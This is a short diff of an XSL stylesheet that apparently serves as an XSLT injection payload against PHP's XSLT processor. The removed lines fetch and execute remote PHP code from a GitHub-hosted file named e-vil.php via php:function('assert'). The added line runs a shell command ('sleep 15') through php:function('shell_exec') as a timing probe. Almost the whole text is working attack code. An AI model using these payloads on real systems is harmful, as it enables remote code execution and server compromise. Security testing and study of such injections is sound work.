@@ -4,10 +4,7 @@
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
         <xsl:value-of select="system-property('xsl:vendor')"/>
-	        <xsl:variable name="payload">
-			    include("https://raw.githubusercontent.com/GotokuNeko/E-VIL/main/e-vil.php")
-	        </xsl:variable>
-	    <xsl:variable name="include" select="php:function('assert',$payload)"/>
+	    <xsl:value-of select="php:function('shell_exec','sleep 15')"/>
     </p>
 </body>
 </html> 
